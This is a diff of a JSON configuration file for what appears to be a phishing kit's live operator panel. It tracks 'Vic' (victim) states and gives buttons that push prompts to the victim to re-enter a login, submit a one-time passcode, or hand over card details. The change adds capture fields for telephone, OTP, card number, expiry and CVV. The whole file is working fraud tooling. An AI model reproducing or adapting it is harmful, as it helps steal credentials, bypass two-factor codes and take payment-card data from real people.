@@ -2445,14 +2445,14 @@
     "buttons": [
       {
         "name": "ASK LOGIN AGAIN",
-        "status": "7"
+        "status": "0"
       },
       {
-        "name": "ASK SMS OTP",
+        "name": "ASK OTP",
         "status": "2"
       },
       {
-        "name": "ASK EMAIL OTP",
+        "name": "ASK CARD",
         "status": "4"
       },
       {
@@ -2463,7 +2463,7 @@
     "status": [
       {
         "status": 0,
-        "meaning": "Vic Resubmitted Login"
+        "meaning": "Vic Resubmitting Login"
       },
       {
         "status": 1,
@@ -2471,19 +2471,19 @@
       },
       {
         "status": 2,
-        "meaning": "Vic Submitting SMS OTP"
+        "meaning": "Vic Submitting OTP"
       },
       {
         "status": 3,
-        "meaning": "Vic Waiting... Submitted SMS OTP"
+        "meaning": "Vic Waiting... Submitted OTP"
       },
       {
         "status": 4,
-        "meaning": "Vic Submitting Email OTP"
+        "meaning": "Vic Submitting Card Info"
       },
       {
         "status": 5,
-        "meaning": "Vic Waiting... Submitted Email OTP"
+        "meaning": "Vic Waiting... Submitted Card Info"
       },
       {
         "status": 6,
@@ -2491,7 +2491,7 @@
       },
       {
         "status": 7,
-        "meaning": "Vic Resubmitting Login"
+        "meaning": "Vic Resubmitted Login"
       }
     ],
     "information": [
@@ -2504,12 +2504,24 @@
         "key": "password"
       },
       {
-        "heading": "SMS OTP",
-        "key": "smsCode"
+        "heading": "Telephone",
+        "key": "telephone"
       },
       {
-        "heading": "Email OTP",
-        "key": "emailCode"
+        "heading": "OTP",
+        "key": "otp"
+      },
+      {
+        "heading": "Card Number",
+        "key": "ccnum"
+      },
+      {
+        "heading": "Card Expiry",
+        "key": "ccexp"
+      },
+      {
+        "heading": "CVV",
+        "key": "cvv"
       }
     ],
     "mainInfo": [
